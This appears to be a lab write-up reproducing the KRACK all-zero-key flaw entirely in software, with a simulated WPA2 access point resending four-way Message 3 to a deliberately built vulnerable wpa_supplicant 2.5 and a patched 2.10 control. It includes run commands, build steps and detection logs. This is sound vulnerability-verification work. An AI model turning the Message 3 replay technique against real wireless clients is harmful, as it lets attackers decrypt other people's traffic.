# Software-only KRACK verdict with the wifi-framework

This is the no-hardware route for an actual pass/fail verdict. The plain
`krack-test-client.py` executes the attack on `mac80211_hwsim` but never prints
its verdict there, because the shared in-kernel datapath hides the packet-number
reset on the air (see `../README.md`, "Limitation of the simulated route"). The
**wifi-framework** (Schepers and Vanhoef, built on `mac80211_hwsim`) gets around
that by detecting a *different* artifact: a client that reinstalls an **all-zero
key** then encrypts frames with it, which the framework decrypts with a zero key.
A changed key value is observable on the wire even on `hwsim`, so the verdict
fires in pure software. No Wi-Fi adapter and no phone are involved; both peers
are software `wpa_supplicant`/`hostapd` instances on virtual radios.

This was run on `decys-vm` (Ubuntu 24.04.5 aarch64, kernel 7.0.0-42). Versions,
commits, and the client source hash are in `config/environment.txt`.

## Why a different victim than the main lab

The framework's `example-krack-zero-key` test simply resends four-way Message 3
(`RESEND_M3`) and watches for an all-zero-key frame. The client that exhibits
that on a plain resend is **wpa_supplicant 2.4/2.5**: it clears the TK from
memory after installing it, so a reinstall writes back all zeros. Our other
builds do not fit this exact test: 2.3 reinstalls the same (non-zero) key (only
a PN reset, which `hwsim` hides), and 2.6's partial `!tk_to_set` guard needs the
TPTK / forged-Message-1 path. So the vulnerable peer here is a freshly built
**wpa_supplicant v2.5**; the patched control is the distro **v2.10**.

## The test case

`testcase/ExampleKrackZerokey.py` is the shipped example, verbatim. Its logic:

- `Trigger.Connected` -> call `resend()`, which issues `RESEND_M3 <client-mac>`
  on the AP's control interface (the framework's customized `hostap_2_10` adds
  this command).
- `Trigger.NoTrigger` -> receive all frames; for each CCMP frame from the client,
  try to decrypt it with `tk = b"\x00"*16`.
- A frame that decrypts with the all-zero key means the client reinstalled a
  zeroed key -> log "Client encrypted a frame with an all-zero key!" and
  `Trigger.Received` terminates the test.

The AP is ordinary WPA2-PSK (SSID `testnetwork`, PSK `passphrase`, CCMP); the
same test case would work for WPA3 just by swapping the AP config.

## How it was run

```
# one-time setup (see REPRODUCE below)
sudo ./setup/setup-hwsim.sh 4          # wlan0..wlan3 on a shared virtual medium

# access-point side: the test
sudo ./setup/venv/bin/python run.py wlan1 example-krack-zero-key

# client side: a vulnerable wpa_supplicant 2.5 on another radio
sudo ~/vuln/wpa_supplicant-2.5/wpa_supplicant/wpa_supplicant \
     -D nl80211 -i wlan2 -c wf-client.conf
sudo ip addr add 192.168.100.2/24 dev wlan2
sudo ping -I wlan2 192.168.100.254     # make the client transmit a data frame
```

The ping is only there to make the client send one data frame after the forced
reinstall; its ARP request is the frame the framework decrypts with the zero
key. For the patched control, the client command points at `/usr/sbin/wpa_supplicant`
(v2.10) instead.

## Results

### Vulnerable client (wpa_supplicant 2.5) - detected

From `logs/vulnerable-2.5-detected.log`:

```
wlan1: EAPOL-4WAY-HS-COMPLETED 02:00:00:00:02:00
TESTING: Send M3 to 02:00:00:00:02:00
[..] Trigger = Connected.
[..] Generating example-krack-zero-key test case.
[..] Dot11 / Dot11QoS / LLC / SNAP / ARP who has 192.168.100.254 says 192.168.100.2
[..] Client encrypted a frame with an all-zero key!
[..] Trigger = Received.
[..] Disconnecting.
```

The AP resends Message 3, the client reinstalls an all-zero key, and its next
data frame (the ARP request) decrypts cleanly with `tk=0`. Verdict: vulnerable.

### Patched client (wpa_supplicant 2.10) - not detected

From `logs/patched-2.10-not-detected.log`:

```
wlan1: EAPOL-4WAY-HS-COMPLETED 02:00:00:00:02:00
TESTING: Send M3 to 02:00:00:00:02:00
wlan1: STA 02:00:00:00:02:00 WPA: received EAPOL-Key msg 4/4 in invalid state (11) - dropped
```

The identical attack runs (Message 3 resent), but the patched client never
installs a zeroed key, so no frame decrypts with `tk=0` and the test reports
nothing (0 detections over the full run). Verdict: not vulnerable.

This is the same before/after conclusion as the main lab's victim-log evidence,
but here it is the framework itself returning the verdict, with no hardware.

## Reproduce from scratch

```
git clone --recursive https://github.com/domienschepers/wifi-framework.git
cd wifi-framework
sudo apt install git make gcc python3-venv net-tools \
  libdbus-1-dev libnl-3-dev libnl-genl-3-dev libnl-route-3-dev libssl-dev
( cd dependencies && ./build.sh )     # builds the customized hostap_2_10
( cd setup && ./pysetup.sh )          # venv with scapy + pycryptodome
git submodule update --init --recursive   # libwifi, if not already pulled
```

Build the vulnerable client (2.5 needs internal TLS, since it predates OpenSSL 3):

```
curl -fsSLO https://w1.fi/releases/wpa_supplicant-2.5.tar.gz
tar xf wpa_supplicant-2.5.tar.gz; cd wpa_supplicant-2.5/wpa_supplicant
cp defconfig .config
printf 'CONFIG_LIBNL32=y\nCONFIG_TLS=internal\nCONFIG_INTERNAL_LIBTOMMATH=y\n' >> .config
make -j2 wpa_supplicant
```

Then run the two commands under "How it was run". NetworkManager must leave the
virtual radios alone; the drop-in used here unmanages `wlan*`, `mon*`, `hwsim*`
(see `../REPRODUCE.md`, step 4).

## Files

```
testcase/ExampleKrackZerokey.py        the shipped test case (verbatim)
logs/vulnerable-2.5-detected.log       AP/test log: all-zero key detected
logs/patched-2.10-not-detected.log     AP/test log: identical attack, nothing detected
logs/client-2.5.log                    vulnerable client association log
logs/client-2.10.log                   patched client association log
config/wf-client.conf                  client wpa_supplicant config (testnetwork/passphrase)
config/framework-ap-hostapd.conf       the framework's WPA2 AP config
config/framework-supplicant.conf       the framework's stock client config
config/environment.txt                 framework/libwifi commits, hostap version, client versions, hashes
```
